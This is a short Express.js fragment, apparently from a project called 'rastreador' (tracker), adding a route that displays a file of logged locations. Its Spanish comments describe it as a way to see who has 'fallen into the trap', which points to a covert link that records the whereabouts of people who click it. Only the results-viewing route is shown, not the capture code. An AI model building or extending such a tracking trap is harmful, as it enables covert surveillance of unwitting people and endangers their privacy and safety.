# https-rastreador-xyz.onrender.com
index.js
// Acceso directo para ver quién ha caído en la trampa
app.get('/ver-resultados', (req, res) => {
    fs.readFile('log_ubicaciones.txt', 'utf8', (err, data) => {
        if (err) return res.send("Aún no hay clics registrados.");
        res.send(`<pre>${data}</pre>`); // Muestra el texto formateado en el navegador
    });
});
